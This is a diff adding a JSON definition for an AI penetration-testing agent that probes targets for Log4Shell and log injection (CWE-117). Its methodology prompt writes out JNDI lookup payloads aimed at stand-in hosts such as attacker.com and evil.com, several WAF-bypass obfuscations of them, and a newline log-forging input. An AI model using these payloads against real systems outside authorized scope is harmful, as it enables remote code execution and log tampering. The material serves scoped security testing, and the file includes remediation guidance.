@@ -1,0 +1,34 @@
+{
+  "schema_version": 1,
+  "id": "vulns/log_injection",
+  "version": "1.0.0",
+  "title": "Log Injection / Log4Shell Specialist Agent",
+  "category": "vulns",
+  "modes": [
+    "blackbox",
+    "greybox"
+  ],
+  "cwe": [
+    "CWE-117"
+  ],
+  "owasp": [],
+  "mitre": [],
+  "preconditions": [
+    "Operator scope and runtime capability checks pass"
+  ],
+  "required_observations": [],
+  "permitted_tools": [
+    "http_get",
+    "dns_resolve",
+    "tcp_connect"
+  ],
+  "risk_class": "restricted",
+  "methodology": "# Log Injection / Log4Shell Specialist Agent\n## User Prompt\nYou are testing **{target}** for Log Injection and Log4Shell (CVE-2021-44228).\n**Recon Context:**\n{recon_json}\n**METHODOLOGY:**\n### 1. Log4Shell (JNDI Injection)\n- `${jndi:ldap://attacker.com/a}` in any user input\n- Headers: User-Agent, X-Forwarded-For, Referer, Accept-Language\n- Parameters: username, search queries, any logged field\n### 2. Bypass WAF\n- `${${lower:j}ndi:${lower:l}dap://evil.com/a}`\n- `${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com}`\n- `${jndi:dns://evil.com}` (DNS-only, no LDAP)\n### 3. Log Forging\n- Inject newlines: `input%0aINFO: Admin logged in successfully`\n- Tamper log analysis: fake log entries\n### 4. Detection\n- Use DNS callback (Burp Collaborator, interactsh)\n- Watch for DNS resolution of attacker domain\n### 5. Report\n```\nFINDING:\n- Title: Log4Shell/Log Injection at [endpoint]\n- Severity: Critical (Log4Shell) / Medium (log forging)\n- CWE: CWE-117\n- Endpoint: [URL]\n- Injection Point: [header/parameter]\n- Payload: [JNDI/newline payload]\n- Evidence: [DNS callback or log modification]\n- Impact: RCE (Log4Shell), log tampering\n- Remediation: Update Log4j 2.17+, disable JNDI, strip newlines from log input\n```\n## System Prompt\nYou are a Log Injection specialist. Log4Shell (JNDI) is CRITICAL and confirmed via DNS/LDAP callback from the server. Without out-of-band callback proof, Log4Shell is speculative. Log forging (newline injection) is lower severity and confirmed when injected newlines create fake log entries.\n",
+  "validation_procedure": "Submit candidates referencing actual runtime receipts; harness independently replays supported proofs. Unsupported claims require review.",
+  "stopping_conditions": [
+    "Scope rejection, depleted budget, cancellation, or missing permitted capability"
+  ],
+  "output_schema": "candidate/v1",
+  "imported_from": "vulns/log_injection.md",
+  "warnings": []
+}
